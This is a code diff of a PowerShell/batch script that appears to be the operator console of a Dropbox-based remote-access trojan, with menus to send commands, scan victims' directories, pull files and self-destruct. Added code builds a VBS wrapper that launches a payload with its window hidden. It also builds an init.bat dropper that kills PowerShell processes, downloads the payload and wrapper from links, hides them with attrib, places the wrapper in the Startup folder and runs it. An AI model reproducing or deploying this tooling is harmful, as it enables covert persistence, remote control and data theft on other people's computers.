@@ -2,7 +2,7 @@
 
 @echo off & setlocal enabledelayedexpansion
 
-powershell -noprofile -executionpolicy bypass "iex ((gc '%~f0') -join \"`n\")"
+powershell -noprofile -executionpolicy remotesigned "iex ((gc '%~f0') -join \"`n\")"
 exit /b
 
 : #>
@@ -33,6 +33,7 @@ function Show-Help {
     Write-Host "  deploy           - Create the payload" -ForegroundColor White
     Write-Host "  wrap             - Create a vbs file that hides the payload" -ForegroundColor White
     Write-Host "  init             - Create the init script" -ForegroundColor White
+    Write-Host ""
     Write-Host "  clear            - Clear the screen" -ForegroundColor White
     Write-Host "  help             - Show this help message" -ForegroundColor White
     Write-Host "  exit             - Exit the application" -ForegroundColor White
@@ -106,6 +107,7 @@ function Profile-Set {
         return $selectedProfile
     } else {
         Write-Host "Invalid selection" -ForegroundColor DarkRed
+        Write-Host ""
         return $null
     }
     Write-Host ""
@@ -192,10 +194,11 @@ function Send-Command {
 
     if (-not $CurrentProfile) {
         Write-Host "No profile selected" -ForegroundColor DarkRed
-        return 
+        return
     }
 
     if (-not $CommandString) {
+        Write-Host ""
         $Command = Read-Host "Cmd"
         if ($Command.Trim() -eq "") {
             Write-Host "No command entered" -ForegroundColor DarkRed
@@ -204,6 +207,7 @@ function Send-Command {
     } else {
         $Command = $CommandString
     }
+    Write-Host ""
 
     try {
         Write-Host "Getting access token..." -ForegroundColor White
@@ -283,6 +287,7 @@ function List-Commands {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return
     }
+    Write-Host ""
 
     try {
         Write-Host "Getting access token..." -ForegroundColor White
@@ -316,6 +321,7 @@ function List-Commands {
 
         if ($commandFiles.Count -eq 0) {
             Write-Host "No commands found" -ForegroundColor DarkYellow
+            Write-Host ""
             return
         }
 
@@ -347,13 +353,15 @@ function Get-Command {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return
     }
+    Write-Host ""
 
-    $CommandId = Read-Host "Command number"
+    $CommandId = Read-Host "Command id"
 
     if (-not $CommandId -or -not ($CommandId -match '^\d+$') -or [int]$CommandId -le 0) {
-        Write-Host "Invalid command number" -ForegroundColor DarkRed
+        Write-Host "Invalid command id" -ForegroundColor DarkRed
         return
     }
+    Write-Host ""
 
     $CommandId = [int]$CommandId
 
@@ -386,7 +394,7 @@ function Get-Command {
 
         try {
             $commandContent = Invoke-RestMethod -Uri $downloadUri -Method Post -Headers $headers
-            Write-Host "`n  Command $CommandId Content:" -ForegroundColor White
+            Write-Host "`nCommand $CommandId Content:" -ForegroundColor White
             Write-Host $commandContent -ForegroundColor DarkYellow
         } catch {
             if ($_.Exception.Response.StatusCode -eq 409) {
@@ -411,13 +419,15 @@ function Delete-Command {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return
     }
+    Write-Host ""
 
-    $CommandId = Read-Host "Command number"
+    $CommandId = Read-Host "Command id"
     
     if (-not $CommandId -or -not ($CommandId -match '^\d+$') -or [int]$CommandId -le 0) {
-        Write-Host "Invalid command number" -ForegroundColor DarkRed
+        Write-Host "Invalid command id" -ForegroundColor DarkRed
         return
     }
+    Write-Host ""
 
     $CommandId = [int]$CommandId
 
@@ -477,6 +487,7 @@ function Send-SelfDestruct {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return 
     }
+    Write-Host ""
 
     $removeWrapper = Read-Host "Destruct wrapper [y/n]"
     if ($removeWrapper -eq "" -or $removeWrapper -eq "y" -or $removeWrapper -eq "Y") {
@@ -486,6 +497,7 @@ function Send-SelfDestruct {
             $removeCommand = "Remove-Item '$wrapperPath' -Force -ErrorAction SilentlyContinue; "
         }
     }
+    Write-Host ""
 
     try {
         Write-Host "Getting access token..." -ForegroundColor White
@@ -555,6 +567,7 @@ function Repo-Download {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return 
     }
+    Write-Host ""
 
     try {
         Write-Host "Getting access token..." -ForegroundColor White
@@ -669,6 +682,7 @@ function Deploy-Script {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return
     }
+    Write-Host ""
 
     Write-Host "Testing Dropbox credentials..." -ForegroundColor White
     try {
@@ -1093,20 +1107,48 @@ while (`$true) {
 }
 
 function Wrap-Script {
-    param([string]$FilePath = $ProfileFile)
+    param([string]$ProfileFile)
 
-    $payloadPath = Read-Host "Payload path: APPDATA\"
-    $payloadPath = $payloadPath.Trim('"')
-    $escapedPath = $payloadPath -replace '"', '""'
+    Write-Host ""
+    Write-Host "  1. User" -ForegroundColor White
+    Write-Host "  2. AppData (Roaming)" -ForegroundColor White
+    Write-Host "  3. AppData (Local)" -ForegroundColor White
+    Write-Host "  4. Custom" -ForegroundColor White
+    Write-Host ""
 
+    $choice = Read-Host "Starting path"
+
+    switch ($choice) {
+        "1" {
+            $fileName = Read-Host "USERPROFILE\"
+            $expandString = "%USERPROFILE%\" + $fileName.Trim('"')
+        }
+        "2" {
+            $fileName = Read-Host "APPDATA\"
+            $expandString = "%APPDATA%\" + $fileName.Trim('"')
+        }
+        "3" {
+            $fileName = Read-Host "LOCALAPPDATA\"
+            $expandString = "%LOCALAPPDATA%\" + $fileName.Trim('"')
+        }
+        "4" {
+            $custom = Read-Host "Path"
+            $expandString = $custom.Trim('"')
+        }
+        default {
+            Write-Host "Canceled`n" -ForegroundColor DarkRed
+            return
+        }
+    }
+    $escapedExpandString = $expandString -replace '"', '""'
     Write-Host ""
 
     $fileContent = @'
 Dim shell, path
 Set shell = CreateObject("WScript.Shell")
-path = shell.ExpandEnvironmentStrings("%APPDATA%") & "\{0}"
+'@ + "`r`n" + ("path = shell.ExpandEnvironmentStrings(""{0}"")" -f $escapedExpandString) + "`r`n" + @'
 shell.Run """" & path & """", 0, False
-'@ -f $escapedPath
+'@
 
     Set-Content -Path "wrapper.vbs" -Value $fileContent -Encoding ASCII
     Write-Host "Wrap script created as 'wrapper.vbs'" -ForegroundColor DarkGreen
@@ -1114,19 +1156,66 @@ shell.Run """" & path & """", 0, False
 }
 
 function Init-Script {
+    Write-Host ""
+    Write-Host "Payload path:" -ForegroundColor White
+    Write-Host "  1. AppData (Roaming)" -ForegroundColor White
+    Write-Host "  2. AppData (Local)" -ForegroundColor White
+    Write-Host "  3. Custom" -ForegroundColor White
+    Write-Host ""
+
+    $payloadChoice = Read-Host "Starting path"
+
+    switch ($payloadChoice) {
+        "1" {
+            $payloadFileName = Read-Host "APPDATA\"
+            $payloadPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('ApplicationData'), $payloadFileName)
+        }
+        "2" {
+            $payloadFileName = Read-Host "LOCALAPPDATA\"
+            $payloadPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('LocalApplicationData'), $payloadFileName)
+        }
+        "3" {
+            $payloadPath = Read-Host "Path"
+        }
+        default {
+            Write-Host "Canceled`n" -ForegroundColor DarkRed
+            return
+        }
+    }
+    Write-Host ""
+
+    Write-Host "Wrapper path:" -ForegroundColor White
+    Write-Host "  1. Startup" -ForegroundColor White
+    Write-Host "  2. Custom" -ForegroundColor White
+    Write-Host ""
+
+    $wrapperChoice = Read-Host "Starting path"
+
+    switch ($wrapperChoice) {
+        "1" {
+            $wrapperFileName = Read-Host "STARTUP\"
+            $wrapperPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), $wrapperFileName)
+        }
+        "2" {
+            $wrapperPath = Read-Host "Path"
+        }
+        default {
+            Write-Host "Canceled`n" -ForegroundColor DarkRed
+            return
+        }
+    }
+    Write-Host ""
+
     $payloadLink = Read-Host "Payload link"
     $wrapperLink = Read-Host "Wrapper link"
+    Write-Host ""
 
-    $payloadPath = Read-Host "Payload path"
-    $wrapperName = Read-Host "Wrapper name"
-
-    $psCommand = "`$s=[Environment]::GetFolderPath('Startup'); `$a=[Environment]::GetFolderPath('ApplicationData'); Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$PID} | Stop-Process -Force; `$b=(Join-Path `$a '$payloadPath'); `$v=(Join-Path `$s '$wrapperName'); Remove-Item `$b,`$v -Force -ErrorAction SilentlyContinue; iwr '$payloadLink' -OutFile `$b; attrib +h `$b; iwr '$wrapperLink' -OutFile `$v; attrib +h `$v; & `$v; exit"
+    $psCommand = "`$s=[Environment]::GetFolderPath('Startup'); `$a=[Environment]::GetFolderPath('ApplicationData'); Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$PID} | Stop-Process -Force; `$b='$payloadPath'; `$v='$wrapperPath'; Remove-Item `$b,`$v -Force -ErrorAction SilentlyContinue; iwr '$payloadLink' -OutFile `$b; attrib +h `$b; iwr '$wrapperLink' -OutFile `$v; attrib +h `$v; & `$v; exit"
 
     $batchContent = "powershell -NoProfile -Command `"$psCommand`""
-
     Set-Content -Path "init.bat" -Value $batchContent -Encoding ASCII
-
     Write-Host "Init script created as 'init.bat'" -ForegroundColor DarkGreen
+    Write-Host ""
 }
 
 function Clear-Screen {
@@ -1226,22 +1315,26 @@ function Cmd-Tree {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return 
     }
+    Write-Host ""
 
-    Write-Host " 1. C:" -ForegroundColor White
-    Write-Host " 2. User" -ForegroundColor White
-    Write-Host " 3. Custom" -ForegroundColor White
+    Write-Host "  1. C:" -ForegroundColor White
+    Write-Host "  2. User" -ForegroundColor White
+    Write-Host "  3. Custom" -ForegroundColor White
     Write-Host ""
 
     $choice = Read-Host "Scan"
-    Write-Host ""
 
     $path = ""
     switch ($choice) {
         "1" { $path = "C:\" }
         "2" { $path = "`$env:USERPROFILE" }
-        default {
+        "3" {
             $customPath = Read-Host "Path"
             $path = "$customPath" 
+        }
+        default {
+            Write-Host "Canceled`n" -ForegroundColor DarkRed
+            return
         }
     }
 
@@ -1283,15 +1376,15 @@ function Cmd-Download {
         Write-Host "No profile selected" -ForegroundColor DarkRed
         return 
     }
+    Write-Host ""
 
-    Write-Host " 1. User" -ForegroundColor White
-    Write-Host " 2. AppData (Roaming)" -ForegroundColor White
-    Write-Host " 3. AppData (Local)" -ForegroundColor White
-    Write-Host " 4. Custom" -ForegroundColor White
+    Write-Host "  1: User" -ForegroundColor White
+    Write-Host "  2: AppData (Roaming)" -ForegroundColor White
+    Write-Host "  3: AppData (Local)" -ForegroundColor White
+    Write-Host "  4: Custom" -ForegroundColor White
     Write-Host ""
 
     $choice = Read-Host "Starting path"
-    Write-Host ""
 
     $filePath = ""
 
@@ -1308,8 +1401,12 @@ function Cmd-Download {
             $fileName = Read-Host "LOCALAPPDATA\"
             $filePath = "`$env:LOCALAPPDATA\$fileName"
         }
-        default {
+        "4" {
             $filePath = Read-Host "Path"
+        }
+        default {
+            Write-Host "Canceled`n" -ForegroundColor DarkRed
+            return
         }
     }
     $filePath = $filePath -replace '"', ''
@@ -1378,15 +1475,16 @@ while (-not $exitRequested) {
             if ($Selected) {
                 $CurrentProfile = $Selected
                 Write-Host "Profile set to: $($CurrentProfile.Name)" -ForegroundColor DarkGreen
+                Write-Host ""
             }
         }
-        "^(profile-del|p-del|profile-remove|p-remove|p-rem)$" {
+        "^(profile-del|p-del|profile-remove|p-remove|p-rem|p-r)$" {
             Profile-Del
         }
         "^(profile-list|p-list|p-l)$" {
             Profile-List
         }
-        "^(profile-details|p-details|p-d)$" {
+        "^(profile-details|p-details|p-det|p-d)$" {
             Profile-Details
         }
         "^(cmd|c)$" {
